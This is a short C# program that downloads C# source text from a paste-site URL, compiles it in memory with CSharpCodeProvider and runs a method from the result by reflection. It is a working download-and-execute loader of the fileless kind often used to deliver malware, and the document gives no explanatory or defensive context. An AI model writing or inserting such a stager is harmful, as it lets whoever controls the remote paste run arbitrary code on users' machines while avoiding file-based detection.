using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.Net;

namespace GenerateCode
{
    class Program
    {
        static void Main(string[] args)
        {
            WebClient Client = new WebClient();
            string Code = Client.DownloadString("https://textbin.pl/raw/untitled-4");
            RunInMemory(Code);
            Console.ReadKey();
        }

        private static void RunInMemory(string code)
        {
            Dictionary<string, string> Dic = new Dictionary<string, string>();
            Dic.Add("CompilerVersion", "v4.0");
            CSharpCodeProvider CSCodeProvider = new CSharpCodeProvider(Dic);
            string[] Assemblies = new string[] { "System.dll", "mscorlib.dll", "System.Windows.Forms.dll" };
            CompilerParameters Params = new CompilerParameters(Assemblies);
            Params.GenerateExecutable = false;
            Params.GenerateInMemory = true;
            Params.IncludeDebugInformation = false;
            CompilerResults Results = CSCodeProvider.CompileAssemblyFromSource(Params, code);
            Results.CompiledAssembly.GetType("Test.Class1").GetMethod("Go").Invoke(null, null);
        }
    }
}
